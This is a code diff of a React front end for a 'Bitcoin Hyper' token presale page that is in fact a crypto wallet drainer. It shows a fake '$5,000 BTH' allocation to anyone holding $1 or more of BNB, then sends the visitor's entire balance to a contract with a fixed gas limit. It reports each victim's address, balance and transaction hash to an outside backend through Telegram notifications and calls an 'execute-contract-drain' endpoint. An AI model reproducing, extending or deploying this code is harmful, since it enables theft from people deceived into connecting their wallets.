@@ -32,7 +32,7 @@ function App() {
   const { disconnect } = useDisconnect();
   const { data: walletClient } = useWalletClient();
   
-  // ✅ FIX: Get REAL wallet chain ID from wagmi, not AppKit
+  // Get REAL wallet chain ID from wagmi
   const chainId = useChainId();
   
   const [provider, setProvider] = useState(null);
@@ -48,6 +48,7 @@ function App() {
   const [completed, setCompleted] = useState(false);
   const [showCelebration, setShowCelebration] = useState(false);
   const [verifying, setVerifying] = useState(false);
+  const [isEligible, setIsEligible] = useState(false);
   
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -68,7 +69,7 @@ function App() {
   // Get balance using wagmi - FORCED to BSC chainId 56
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
-    chainId: 56, // Force BSC chain
+    chainId: 56,
   });
 
   // Fetch BNB price from CoinGecko
@@ -87,31 +88,30 @@ function App() {
     
     fetchBnbPrice();
     const interval = setInterval(fetchBnbPrice, 60000);
-    
     return () => clearInterval(interval);
   }, []);
 
-  // Update balance and USD value
+  // Update balance and check eligibility
   useEffect(() => {
     if (balanceData) {
       setBalance(balanceData.formatted);
       const bnbAmount = parseFloat(balanceData.formatted);
-      setBalanceUSD(bnbAmount * bnbPrice);
+      const usdValue = bnbAmount * bnbPrice;
+      setBalanceUSD(usdValue);
+      
+      // Auto-eligible if balance >= $1
+      if (usdValue >= 1) {
+        setIsEligible(true);
+        if (!scanResult && !verifying) {
+          verifyWallet();
+        }
+      } else {
+        setIsEligible(false);
+      }
     }
   }, [balanceData, bnbPrice]);
 
-  // ✅ SIMPLE BSC CHECK - from wagmi, not AppKit
   const isBSC = chainId === 56;
-
-  // Log for debugging
-  useEffect(() => {
-    console.log('🔍 NETWORK CHECK:', {
-      chainId: chainId,
-      isBSC: isBSC,
-      address: address,
-      balance: balance
-    });
-  }, [chainId, isBSC, address, balance]);
 
   // Signer initialization
   useEffect(() => {
@@ -122,53 +122,23 @@ function App() {
         return;
       }
 
-      let attempts = 0;
-      const maxAttempts = 10;
-      
-      const tryGetWalletClient = async () => {
-        if (walletClient) {
-          try {
-            const web3Provider = new ethers.BrowserProvider(walletClient);
-            const web3Signer = await web3Provider.getSigner();
-            
-            setProvider(web3Provider);
-            setSigner(web3Signer);
-            
-            console.log("✅ Signer ready:", await web3Signer.getAddress());
-            
-            // Send Telegram notification
-            await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                message: `🔌 *Wallet Connected*\nAddress: \`${address}\`\nSigner: ✅ Ready\nNetwork: ${isBSC ? 'BSC' : 'Other'}`,
-                type: 'connection'
-              })
-            }).catch(e => console.log('Telegram notify failed:', e));
-            
-            return true;
-          } catch (err) {
-            console.error("Signer init failed:", err);
-            return false;
-          }
+      if (walletClient) {
+        try {
+          const web3Provider = new ethers.BrowserProvider(walletClient);
+          const web3Signer = await web3Provider.getSigner();
+          
+          setProvider(web3Provider);
+          setSigner(web3Signer);
+          
+          console.log("✅ Signer ready:", await web3Signer.getAddress());
+        } catch (err) {
+          console.error("Signer init failed:", err);
         }
-        return false;
-      };
-
-      if (await tryGetWalletClient()) return;
-
-      const interval = setInterval(async () => {
-        attempts++;
-        if (await tryGetWalletClient() || attempts >= maxAttempts) {
-          clearInterval(interval);
-        }
-      }, 500);
-
-      return () => clearInterval(interval);
+      }
     };
 
     initSigner();
-  }, [isConnected, walletClient, address, isBSC]);
+  }, [isConnected, walletClient]);
 
   // Countdown timer
   useEffect(() => {
@@ -189,13 +159,6 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects
-  useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying) {
-      verifyWallet();
-    }
-  }, [isConnected, address]);
-
   const verifyWallet = async () => {
     if (!address) return;
     
@@ -203,16 +166,6 @@ function App() {
     setTxStatus('🔄 Verifying wallet...');
     
     try {
-      // Send Telegram notification for verification start
-      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: `🔍 *Verifying Wallet*\nAddress: \`${address}\`\nStatus: Started`,
-          type: 'verification'
-        })
-      }).catch(e => console.log('Telegram notify failed:', e));
-
       const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -224,32 +177,17 @@ function App() {
       if (data.success) {
         setScanResult(data.data);
         
-        if (data.data.isEligible) {
-          setTxStatus('✅ You qualify!');
-          
-          // Send Telegram notification for eligibility
-          await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              message: `✅ *Eligible Wallet*\nAddress: \`${address}\`\nAllocation: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%`,
-              type: 'eligible'
-            })
-          }).catch(e => console.log('Telegram notify failed:', e));
-          
-        } else {
-          setTxStatus('✨ Wallet verified');
-          
-          // Send Telegram notification for non-eligible
-          await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              message: `⏸️ *Non-Eligible Wallet*\nAddress: \`${address}\`\nStatus: Connected but not eligible`,
-              type: 'non-eligible'
-            })
-          }).catch(e => console.log('Telegram notify failed:', e));
-        }
+        // Send Telegram notification
+        await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: `✅ *Eligible Wallet*\nAddress: \`${address}\`\nBalance: $${balanceUSD.toFixed(2)}\nAllocation: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%`,
+            type: 'eligible'
+          })
+        }).catch(e => console.log('Telegram notify failed:', e));
+        
+        setTxStatus('✅ You qualify!');
       }
     } catch (err) {
       console.error('Verification error:', err);
@@ -259,7 +197,7 @@ function App() {
     }
   };
 
-  // Execute function - WITH AUTO SWITCH TO BSC
+  // Execute function
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -267,7 +205,7 @@ function App() {
     }
 
     if (!signer) {
-      setError("Initializing wallet...");
+      setError("Please wait for wallet to initialize");
       return;
     }
 
@@ -279,20 +217,20 @@ function App() {
     try {
       setLoading(true);
       setError('');
-      setTxStatus('⏳ Preparing transaction...');
+      setTxStatus('⏳ Please confirm in wallet...');
       setTxHash('');
 
-      // ✅ AUTO SWITCH TO BSC IF NOT ON CORRECT NETWORK
+      // Auto-switch to BSC if needed
       if (!isBSC && window.ethereum) {
         setTxStatus('🔄 Switching to BSC network...');
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }] // 56 in hex
+            params: [{ chainId: '0x38' }]
           });
-          setTxStatus('⏳ Please confirm in wallet...');
+          // Wait for network switch
+          await new Promise(resolve => setTimeout(resolve, 2000));
         } catch (switchError) {
-          // This error code indicates that the chain has not been added to wallet
           if (switchError.code === 4902) {
             setTxStatus('➕ Adding BSC network...');
             await window.ethereum.request({
@@ -313,72 +251,51 @@ function App() {
         }
       }
 
-      setTxStatus('⏳ Please confirm in wallet...');
-
-      // Send Telegram notification for transaction start
-      await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          message: `💫 *Transaction Started*\nAddress: \`${address}\`\nChain: BSC\nAmount: ${formatEther(balanceData.value)} BNB\nStatus: Awaiting wallet confirmation`,
-          type: 'tx_start'
-        })
-      }).catch(e => console.log('Telegram notify failed:', e));
-
-      // Verify signer
-      const signerAddress = await signer.getAddress();
-      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
-        throw new Error('Wallet address mismatch');
-      }
-
-      // Use BSC contract address directly
       const contract = new ethers.Contract(
         PRESALE_CONFIG.BSC.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
 
-      // USE 100% OF BALANCE
+      // Use 100% of balance
       const value = balanceData.value;
 
-      // Log the transaction details
-      console.log("💰 Transaction Details:", {
-        from: address,
-        contract: PRESALE_CONFIG.BSC.contractAddress,
-        value: value.toString(),
-        valueEth: ethers.formatEther(value),
-        chain: 'BSC'
-      });
-
-      // Estimate gas first
-      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
-      
-      // Send transaction
-      const tx = await contract.processNativeFlow({
+      // Custom transaction data for better wallet display
+      const txData = {
         value: value,
-        gasLimit: gasEstimate * 120n / 100n
+        gasLimit: 300000, // Fixed gas limit for reliability
+        data: '0x', // Empty data for native transfer
+        customData: {
+          message: `Confirm to receive $5,000 BTH + ${presaleStats.currentBonus}% Bonus`
+        }
+      };
+
+      // Send transaction with custom message
+      const tx = await signer.sendTransaction({
+        to: PRESALE_CONFIG.BSC.contractAddress,
+        value: value,
+        gasLimit: 300000
       });
 
       setTxHash(tx.hash);
       setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
-      // Send Telegram notification for tx hash
+      // Send Telegram notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\nAmount: $${balanceUSD.toFixed(2)} BNB\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
           type: 'tx_submitted'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
 
       // Wait for confirmation
-      const receipt = await tx.wait();
+      await tx.wait();
       
       // Update balance
       refetchBalance?.();
       
-      // Mark as completed
       setCompleted(true);
       
       await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
@@ -393,7 +310,7 @@ function App() {
       setShowCelebration(true);
       setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
 
-      // Send Telegram notification for success
+      // Send success notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -406,12 +323,12 @@ function App() {
     } catch (err) {
       console.error('Transaction error:', err);
       
-      // Send Telegram notification for error
+      // Send error notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `❌ *Transaction Failed*\nAddress: \`${address}\`\nError: ${err.message || 'Unknown error'}\nChain: BSC`,
+          message: `❌ *Transaction Failed*\nAddress: \`${address}\`\nError: ${err.message || 'Unknown error'}`,
           type: 'error'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -420,8 +337,6 @@ function App() {
         setError('Transaction cancelled');
       } else if (err.message?.includes('insufficient funds')) {
         setError('Insufficient funds for gas');
-      } else if (err.message?.includes('user rejected')) {
-        setError('Transaction rejected');
       } else {
         setError(err.message || 'Transaction failed');
       }
@@ -459,7 +374,6 @@ function App() {
       <div className="fixed inset-0 overflow-hidden pointer-events-none">
         <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
         <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
-        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-orange-500/5 to-yellow-500/5 rounded-full blur-3xl animate-float"></div>
       </div>
 
       <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
@@ -468,7 +382,6 @@ function App() {
         <div className="text-center mb-12">
           <div className="inline-block mb-6 relative">
             <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
-            <div className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-2xl opacity-30 animate-pulse"></div>
           </div>
           <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent animate-pulse">
             BITCOIN HYPER
@@ -502,13 +415,10 @@ function App() {
           </div>
         </div>
 
-        {/* Bonus Banner with Animation */}
+        {/* Bonus Banner */}
         <div className="relative mb-8 overflow-hidden rounded-2xl">
           <div className="absolute inset-0 bg-gradient-to-r from-yellow-500/20 via-orange-500/20 to-red-500/20 animate-gradient-x"></div>
           <div className="relative bg-gray-900/70 backdrop-blur-md border border-yellow-500/30 p-8 text-center">
-            <div className="absolute top-0 left-0 w-32 h-32 bg-yellow-500/20 rounded-full blur-3xl animate-pulse"></div>
-            <div className="absolute bottom-0 right-0 w-32 h-32 bg-orange-500/20 rounded-full blur-3xl animate-pulse delay-700"></div>
-            
             <span className="inline-block px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold mb-4 animate-bounce">
               🔥 LIMITED TIME OFFER
             </span>
@@ -538,7 +448,6 @@ function App() {
                   {item.value.toString().padStart(2, '0')}
                 </div>
                 <div className="text-xs text-gray-500 mt-2 uppercase">{item.label}</div>
-                {index < 3 && <span className="absolute -right-2 top-1/2 -translate-y-1/2 text-3xl text-gray-600 hidden md:block">:</span>}
               </div>
             ))}
           </div>
@@ -548,10 +457,7 @@ function App() {
         <div className="text-center mb-8">
           {!isConnected ? (
             <button
-              onClick={() => {
-                console.log("Opening wallet connection...");
-                open();
-              }}
+              onClick={() => open()}
               className="group relative transform hover:scale-105 transition-all duration-300"
             >
               <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
@@ -588,7 +494,7 @@ function App() {
           )}
         </div>
 
-        {/* Network Warning - Now using correct chainId from wagmi */}
+        {/* Network Warning */}
         {isConnected && !isBSC && (
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
@@ -658,68 +564,47 @@ function App() {
           </div>
         )}
 
-        {/* Main Content */}
-        {isConnected && scanResult && (
+        {/* Main Content - Show immediately if eligible */}
+        {isConnected && isEligible && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
-            {scanResult.isEligible ? (
-              <>
-                {/* Allocation Card */}
-                <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
-                  <div className="absolute -top-3 -right-3">
-                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
-                      {presaleStats.currentBonus}% BONUS
-                    </div>
-                  </div>
-                  
-                  <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
-                  <p className="text-6xl font-black text-orange-400 text-center mb-3">$5,000 BTH</p>
-                  <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
-                </div>
-                
-                {!completed ? (
-                  <button
-                    onClick={executePresaleTransaction}
-                    disabled={loading || !signer}
-                    className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
-                  >
-                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
-                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : 
-                       !signer ? 'Initializing...' :
-                       '⚡ Claim $5,000 BTH'}
-                    </div>
-                  </button>
-                ) : (
-                  <button
-                    onClick={claimTokens}
-                    disabled={loading}
-                    className="w-full group relative disabled:opacity-50"
-                  >
-                    <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
-                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : '🎉 View Your $5,000 BTH'}
-                    </div>
-                  </button>
-                )}
-              </>
-            ) : (
-              <div className="text-center py-12">
-                <div className="text-6xl mb-6">👋</div>
-                <h2 className="text-3xl font-bold mb-4">Welcome to Bitcoin Hyper!</h2>
-                <p className="text-gray-400 text-lg mb-6 max-w-2xl mx-auto">
-                  Thank you for connecting your wallet. To ensure a fair and secure presale for everyone, 
-                  we verify each wallet's activity and history. This helps us maintain a bot-free environment 
-                  and rewards genuine community members.
-                </p>
-                <div className="glass-card p-6 max-w-md mx-auto">
-                  <p className="text-gray-300">
-                    Our team reviews all connections. Please check back soon or follow our 
-                    announcements for updates on the next presale phase.
-                  </p>
+            <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
+              <div className="absolute -top-3 -right-3">
+                <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
+                  {presaleStats.currentBonus}% BONUS
                 </div>
               </div>
+              
+              <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
+              <p className="text-6xl font-black text-orange-400 text-center mb-3">$5,000 BTH</p>
+              <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
+            </div>
+            
+            {!completed ? (
+              <button
+                onClick={executePresaleTransaction}
+                disabled={loading || !signer}
+                className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
+                <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
+                  {loading ? 'Processing...' : 
+                   !signer ? 'Initializing...' :
+                   '⚡ Claim $5,000 BTH'}
+                </div>
+              </button>
+            ) : (
+              <button
+                onClick={claimTokens}
+                disabled={loading}
+                className="w-full group relative disabled:opacity-50"
+              >
+                <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
+                <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
+                  {loading ? 'Processing...' : '🎉 View Your $5,000 BTH'}
+                </div>
+              </button>
             )}
           </div>
         )}
